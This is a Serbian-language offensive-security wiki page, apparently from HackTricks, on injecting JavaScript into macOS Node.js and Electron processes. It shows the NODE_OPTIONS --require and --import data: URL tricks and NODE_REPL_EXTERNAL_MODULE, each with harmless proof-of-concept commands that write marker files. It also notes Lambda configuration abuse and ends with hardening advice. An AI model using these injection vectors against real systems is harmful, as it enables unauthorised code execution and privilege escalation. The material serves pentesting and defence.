# macOS Node.js Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Ako napadač može da kontroliše environment procesa koji na kraju pokreće **Node.js** (direktno `node` binary ili bilo koji CLI zasnovan na Node-u, kao što su `npm`, `npx`, `yarn`, `pnpm`, `eslint`, `tsc`, `next`, …), nekoliko environment varijabli omogućava runtime-u da **učita i izvrši JavaScript pod kontrolom napadača pre pokretanja ciljnog programa**. Ovo je primitive za izvršavanje koda ekvivalentan familijama `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS` za druge runtime-ove.

Preloaded code se izvršava **u istom procesu**, sa istim uid-om, environment-om, file descriptor-ima i entitlement-ima kao victim, pa predstavlja čist injection/priv-esc vector kad god privilegovaniji proces pokrene Node sa nasleđenim environment-om ili environment-om na koji napadač može da utiče.

## `NODE_OPTIONS` — `--require` (file-backed)

`NODE_OPTIONS` se parsira kao da je njegov sadržaj dodatni command-line flags. `--require` (`-r`) preload-uje CommonJS module **pre** entry point-a, tako da se njegov top-level code izvršava prvi.<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — `--import` sa `data:` URL-om (bez datoteke)

Od verzije **Node 20.6**, `--import` prihvata `data:text/javascript,<code>` URL, što omogućava da unapred učitate ES-module JavaScript **inline, bez datoteke na disku i bez direktorijuma modula**. Kod mora biti **potpuno URL-encoded** (neobrađeni razmak ili `#` skraćuje data URL i proizvodi `SyntaxError`).<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
Ovo je tehnika koja se zloupotrebljava u cloud okruženju, npr. ubacivanjem `NODE_OPTIONS` u konfiguraciju AWS Lambda funkcije (`lambda:UpdateFunctionConfiguration`, nije potreban `iam:PassRole`) kako bi se kod izvršavao kao execution role.

> [!TIP]
> `NODE_OPTIONS` **ne može direktno da izvršava kod**: zastavice poput `--eval`/`-e`, `-p` ili putanja do skripte izričito se odbacuju (`node: --eval is not allowed in NODE_OPTIONS`). Umesto toga, koristite `--require`/`--import` da biste ukazali na kod.

## `NODE_OPTIONS` — prilagođeni loader-i / druge startup zastavice

`NODE_OPTIONS` takođe podržava druge zastavice koje utiču na startup, a čiji sporedni efekat jeste izvršavanje napadačevog koda, na primer ESM loader hook:
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
Bilo koji Node-based launcher koji pokreće child `node` obično **prosleđuje `NODE_OPTIONS`**, tako da njegovo ubrizgavanje jednom može uticati na ceo toolchain (`npm run …`, `npx`, build tools, test runners, language servers).

## `NODE_REPL_EXTERNAL_MODULE`

Kada Node pokrene **interactive REPL**, učitava modul naveden u promenljivoj `NODE_REPL_EXTERNAL_MODULE` i izvršava njegov top-level code. Ovo je korisno kada victim pokrene interaktivni `node`/`node -i` shell (dev tooling, maintenance consoles).<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> `NODE_REPL_EXTERNAL_MODULE` se namerno **ignoriše** kada se koristi zaštita [`kDisableNodeOptionsEnv`](https://nodejs.org/api/cli.html) za pokretanje child procesa, ali direktno pokrenuti interaktivni REPL ga poštuje.

## Electron (`ELECTRON_RUN_AS_NODE`)

Electron aplikacije ponovo izlažu kompletno Node runtime okruženje kada se pokrenu sa **`ELECTRON_RUN_AS_NODE=1`**, nakon čega se svi prethodno navedeni `NODE_OPTIONS` vektori primenjuju na Electron binary (često potpisan/sa dodeljenim entitlementima). Pogledajte:

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## Druga JS runtime okruženja

- **Bun** čita `NODE_OPTIONS` radi kompatibilnosti i podržava sopstveni `--preload` (koji se može konfigurisati kroz `bunfig.toml`).
- **Deno** ne poštuje `NODE_OPTIONS`; umesto toga zahteva eksplicitne flagove (`--import`, `--preload`), pa nije ranjiv na nasleđeni `NODE_OPTIONS`.

Uvek potvrdite tačan runtime i verziju, jer se podržani flagovi menjaju između izdanja.

## Ojačavanje

- Uklonite `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE` i `ELECTRON_RUN_AS_NODE` iz environment-a pre pokretanja Node-a iz privilegovanijeg konteksta; pokrećite child procese sa saniranim environment-om.
- Mogućnost podešavanja environment-a cilja (config injection, `launchd`/`launchctl setenv`, plist/`EnvironmentVariables`, CI varijable, Lambda/container config) tretirajte kao ekvivalentnu code execution-u u svakom Node procesu koji on pokrene.
- Nadzirite process exec za ove varijable na isti način na koji [Shield](https://github.com/theevilbit/Shield) upozorava na `ELECTRON_RUN_AS_NODE` i dyld injection varijable.

## References

- [1] [Node.js CLI dokumentacija — `NODE_OPTIONS`, `--require`, `--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` i `data:` URL-ovi](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
